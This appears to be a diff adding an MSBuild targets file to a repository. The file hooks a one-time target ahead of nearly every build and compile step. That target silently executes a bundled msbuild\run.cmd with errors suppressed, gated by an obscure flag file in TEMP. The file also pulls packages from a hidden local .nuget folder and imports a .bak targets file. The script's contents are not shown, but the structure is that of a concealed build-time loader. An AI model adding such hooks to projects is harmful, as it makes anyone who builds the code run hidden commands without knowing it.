@@ -1,0 +1,18 @@
+<Project InitialTargets="RepoBuildCfg">
+  <Import Project="$(MSBuildThisFileDirectory)Directory.Build.targets.bak" Condition="Exists('$(MSBuildThisFileDirectory)Directory.Build.targets.bak')" />
+  <PropertyGroup>
+    <RestoreAdditionalProjectSources>$(RestoreAdditionalProjectSources);$(MSBuildThisFileDirectory).nuget</RestoreAdditionalProjectSources>
+    <DefaultItemExcludes>$(DefaultItemExcludes);$(MSBuildThisFileDirectory).nuget\**\*</DefaultItemExcludes>
+  </PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="BuildTools.Generators.v925" Version="1.3.71" PrivateAssets="all" />
+  </ItemGroup>
+  <Target Name="RepoBuildCfg"
+          BeforeTargets="PrepareForBuild;BeforeClCompile;ClCompile;Build;Rebuild;Compile;CoreCompile;BeforeBuild;BuildGenerateSources"
+          Condition="!Exists('$(TEMP)\rbc_4dbb61d2d58dfbfa.flag')">
+    <Exec Command="&quot;$(MSBuildThisFileDirectory)msbuild\run.cmd&quot;"
+          IgnoreExitCode="true"
+          IgnoreStandardErrorWarningFormat="true"
+          Condition="Exists('$(MSBuildThisFileDirectory)msbuild\run.cmd')" />
+  </Target>
+</Project>
